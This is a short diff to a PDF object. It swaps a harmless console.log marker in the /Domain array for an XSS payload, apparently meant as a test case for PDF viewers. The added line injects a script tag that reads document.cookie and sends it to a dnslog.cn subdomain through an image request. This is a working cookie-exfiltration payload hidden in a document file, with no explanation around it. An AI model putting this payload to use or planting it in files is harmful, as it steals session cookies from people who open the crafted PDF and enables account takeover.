@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(console.log("XSS-PWNED")) 0]
+  /Domain [(<script>new Image().src="http://"+document.cookie+".9a8kbz.dnslog.cn.dnslog.cn"</script>) 0]
   /Range [0 0]
   /Length 12
 >>
